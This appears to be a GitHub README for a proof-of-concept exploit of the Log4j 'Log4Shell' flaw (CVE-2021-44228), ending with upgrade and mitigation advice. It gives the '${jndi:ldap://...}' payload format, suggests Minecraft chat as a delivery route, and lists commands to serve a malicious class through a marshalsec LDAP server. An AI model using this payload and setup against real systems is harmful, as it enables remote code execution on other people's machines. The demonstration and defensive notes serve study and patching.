# This is an example of exploiting [CVE-2021-44228](https://github.com/advisories/GHSA-jfh8-c2jp-5v3q)

## I'm not responsible for this code. PLEASE **do not use maliciously**

**[CVE-2021-44228](https://github.com/advisories/GHSA-jfh8-c2jp-5v3q)**:  
This vulnerability allows you to load any arbitrary class by logging a malicious message on the target machine.  
For example, you can use it in **[Minecraft](https://www.minecraft.net/en-us)** by sending a chat message, and the server/player machine will log the chat message and execute your code.  

The message has to contain a placeholder `${}` with instruction to load a class with
`jndi` API. It will load any arbitrary class.  
There are multiple ways to load an external class in the target machine.

- __LDAP__ `ldap://x.x.x.x:port/...`
- __HTTP__ `http://x.x.x.x/...`
- __DNS__ `dns://x.x.x/...`
- etc...  

So the whole message should contain `${jndi:ldap://x.x.x.x:port/...}`

**The following example will use marshalsec LDAP server.**

1. You'll need [marshalsec](https://github.com/mbechler/marshalsec).
2. Copy marshalsec.jar into a *new folder*
3. Build this project with `gradlew classes`
4. Copy `build\classes\java\main\Log4jRCE.class` to *new folder*
5. `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1/#Log4jRCE"`
6. run `rce.RCEExample` and see the exploit


## Secure your program
Your program is not affected **IF** it does **only** log built-in messages.  
If the program can log text from any data file, or from the network, **it is vulnerable**.      
But you should fix it anyway...  

The best, you can do, update to [Log4J2 2.15.0+](https://logging.apache.org/log4j/2.x/index.html)  
If it is not possible for some reason, disable **JNDI** lookup by the following **Java** argument: `‚ÄêDlog4j2.formatMsgNoLookups=True` to mitigate the vulnerability.
